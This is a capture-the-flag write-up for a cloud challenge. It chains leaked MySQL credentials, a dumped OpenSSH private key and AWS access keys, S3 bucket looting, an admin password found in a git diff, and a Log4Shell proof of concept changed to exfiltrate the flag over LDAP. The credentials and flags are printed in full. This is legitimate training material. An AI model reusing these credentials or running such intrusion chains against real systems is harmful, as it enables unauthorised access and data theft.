# [Hard] Cloud Escalator Part 1 (300 points)

> The AI managed to get into our secure smart city portal, but we have no clue how it got there.
>
> Author information: This challenge is developed by Ankit Parashar, Vivek Mukkam Palavila Vijayan, Ralph van den Hoff and Fouad Aljaber.

- Guess and find `/login` endpoint. Could also be found by briefly using gobuster/dirbuster, etc.

- Go to `forgotpassword.html`. Look at HTML and find mysqldb credentials.
  - `mysql -u allen -p8%pZ-s^Z+P4d=h@P -h escalator.c45luksaam7a.us-east-1.rds.amazonaws.com`
  - Make use of SQL commands: `show databases;`, `show tables;`, `use <DATABASE_NAME>;`, `select * from <TABLE_NAME>;`...

- Interact with the mysqldb server and find first flag, git private key as well as AWS credentials
  - Flag present in `users.data`:
  ```
  CTF{!_p@wn3d_db_4_fu9
  ```
  
  - Git private key present in `env.git`
  
  ```
  -----BEGIN OPENSSH PRIVATE KEY-----
  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
  -----END OPENSSH PRIVATE KEY-----
  ```

  - AWS credentials present in `config.aws_env`
  ```
  user: s3user1
  access key: AKIAWSXCCGNYFS7NN2XU
  secret key: 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
  ```
- Make use of AWS Credentials.
  - Configure
  
  ```
  $ aws configure                                    
  AWS Access Key ID [****************N2XU]: AKIAWSXCCGNYFS7NN2XU
  AWS Secret Access Key [****************9P0I]: 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
  Default region name [us-east-1]: us-east-1
  Default output format [json]: json
  ```

  - List buckets
  ```
  $ aws s3 ls
  (escalator-logger-armour comes out to be the bucket name)

  $ aws s3 ls s3://escalator-logger-armour/
                             PRE new/
  2022-07-15 13:57:35      11351 Logs.txt

  $ aws s3 cp s3://escalator-logger-armour/Logs.txt .
  download: s3://escalator-logger-armour/Logs.txt to ./Logs.txt
  ```

  - Find github repository and second flag in Logs.txt file
  
  ```
  repo: github.com/cloudhopper-sec/app.git
  flag: CTF{S3eing_T3r0ugh_!t}
  ```

- Make use of ssh private key to clone repo. In the file `~/.ssh/config`, write the following:

  ```
  Host github
    HostName github.com
    IdentityFile /home/arrow/Desktop/ctf/hackazon-deloitte-2022/cloud-esacalator-part-1/git-private-sshkey.key
    IdentitiesOnly Yes
  ```

  Clone repository with `git clone git@github:cloudhopper-sec/app.git`

- Git diff between latest two commits gives us admin password. Logging in gives us the third flag.

  ```bash
  $ git diff HEAD HEAD~1

  diff --git a/src/main/java/com/cloudEscalator/util/CookieHandler.java b/src/main/java/com/cloudEscalator/util/CookieHandler.java
  index f787547..a7a0b8c 100644
  --- a/src/main/java/com/cloudEscalator/util/CookieHandler.java
  +++ b/src/main/java/com/cloudEscalator/util/CookieHandler.java
  @@ -9,8 +9,8 @@ import java.util.Optional;
  
  public class CookieHandler {
      private static final String LOGIN_COOKIE_NAME = "LoggedIn";
  -    private static final String USERNAME = "";
  -    private static final String PASSWORD = "";
  +    private static final String USERNAME = "admin";
  +    private static final String PASSWORD = "C@llTh3PluMM3r";
  
      private static final String SHA256_LOGIN_HASH = Hashing.sha256()
              .hashString(USERNAME+PASSWORD, StandardCharsets.UTF_8)
  ```

  Flag: `CTF{Y0u_G0t_A_l3ak}`

- Try different exploit strategies. Apache 8.0.36 has multiple severe CVEs present but it doesn't seem to work. Log4j version is 2.14.1 which is a vulnerable version.
  - Figure out that log4j can be used to
  - Setup log4j POC. Here's the one I used: https://github.com/marcourbano/Log4Shell_PoC
  - Change Exploit.java file in POC to send yourself the flag using ldap lookup
  - Flag: `CTF{H3aT_th3_L0GF0rg3}`
